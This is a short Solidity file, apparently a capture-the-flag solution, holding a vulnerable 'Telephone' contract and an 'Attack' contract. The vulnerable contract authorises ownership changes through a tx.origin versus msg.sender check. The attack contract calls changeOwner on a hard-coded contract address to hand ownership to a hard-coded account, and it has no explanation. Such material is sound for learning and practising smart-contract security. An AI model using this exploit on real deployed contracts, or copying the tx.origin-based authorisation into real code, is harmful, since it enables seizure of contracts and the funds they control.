pragma solidity 0.8.6;

contract Telephone{

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
  
  contract Attack{
    
    
    function attack() public {
  
        Telephone(0xE95DFA0A442B2589c91243aF370998119df7e812).changeOwner(0x2BF5A2f4E77Ced2F6456d1b839b8e46E0E8e34E2);
    }


}

